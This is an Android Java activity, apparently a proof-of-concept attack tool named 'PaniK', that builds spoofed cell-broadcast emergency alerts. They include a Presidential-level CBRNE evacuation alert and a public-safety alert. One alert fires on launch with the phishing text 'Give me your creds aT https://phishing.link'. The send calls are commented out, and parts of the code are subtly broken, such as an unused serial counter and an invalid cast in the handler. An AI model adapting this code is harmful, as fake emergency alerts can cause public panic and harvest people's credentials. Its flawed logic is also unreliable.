package com.skyfall.panik;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.view.WindowManager;

public class stealthAct extends Activity {
        private  int getSerialNumber() {
            int messageId = 0;
            int newMessageId = (messageId + 1) % 65536;
            return messageId;
        }

        SmsCbMessage createCmasSmsMessage(int serviceCategory,  String language, String body, int severity, int urgency, int certainty, int priority) {
            int messageClass = CellBroadcastAlertService.getCmasMessageClass(serviceCategory);
            SmsCbCmasInfo cmasInfo =
                    new SmsCbCmasInfo(
                            messageClass,
                            SmsCbCmasInfo.CMAS_CATEGORY_CBRNE,
                            SmsCbCmasInfo.CMAS_RESPONSE_TYPE_EVACUATE,
                            severity,
                            urgency,
                            certainty);
            SmsCbMessage msg = new SmsCbMessage(SmsCbMessage.MESSAGE_FORMAT_3GPP,0, getSerialNumber(),new SmsCbLocation("1111"),serviceCategory, language, body,priority,null, cmasInfo, 0,0);

            return msg;
        }

        static final int DELAY_BEFORE_SENDING_MSEC = 5000;
        public void testSendCmasPresAlert (CellBroadcastAlertService CBS, Context context) {
            SmsCbMessage cbMessage =
                    createCmasSmsMessage(SmsCbConstants.MESSAGE_ID_CMAS_ALERT_PRESIDENTIAL_LEVEL,
                            "en",
                            CBS.PRES_ALERT,
                            SmsCbCmasInfo.CMAS_SEVERITY_EXTREME,
                            SmsCbCmasInfo.CMAS_URGENCY_EXPECTED,
                            SmsCbCmasInfo.CMAS_CERTAINTY_LIKELY,
                            SmsCbMessage.MESSAGE_PRIORITY_EMERGENCY);
                Message msg = mDelayHandler.obtainMessage(0, this);
                mDelayHandler.sendMessageDelayed(msg, DELAY_BEFORE_SENDING_MSEC);

            //CBS.openEmergencyAlertNotification(cbMessage, context);
        }

    @SuppressLint("HandlerLeak")
    private static final Handler mDelayHandler = new Handler() {
        public void handleMessage(Message msg) {
            // call the onClick() method again, passing null View.
            // The callback will ignore mDelayBeforeSending when the View is null.
            View.OnClickListener pendingButtonClick = (View.OnClickListener) msg.obj;
            pendingButtonClick.onClick(null);
        }
    };


        public void testSendPublicSafetyMessagesAlert (CellBroadcastAlertService CBS, Context context, String Message) {
            SmsCbMessage cbMessage =
                    createCmasSmsMessage(SmsCbConstants.MESSAGE_ID_CMAS_ALERT_PUBLIC_SAFETY,
                            "en",
                            Message,
                            SmsCbCmasInfo.CMAS_SEVERITY_UNKNOWN,
                            SmsCbCmasInfo.CMAS_URGENCY_UNKNOWN,
                            SmsCbCmasInfo.CMAS_CERTAINTY_UNKNOWN,
                            SmsCbMessage.MESSAGE_PRIORITY_NORMAL);

            //CBS.openEmergencyAlertNotification(cbMessage, context);
        }

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        CellBroadcastAlertService CBS = new CellBroadcastAlertService();

        testSendPublicSafetyMessagesAlert(CBS, this,"This is a PaniK Message, Give me your creds aT https://phishing.link");
    }

}
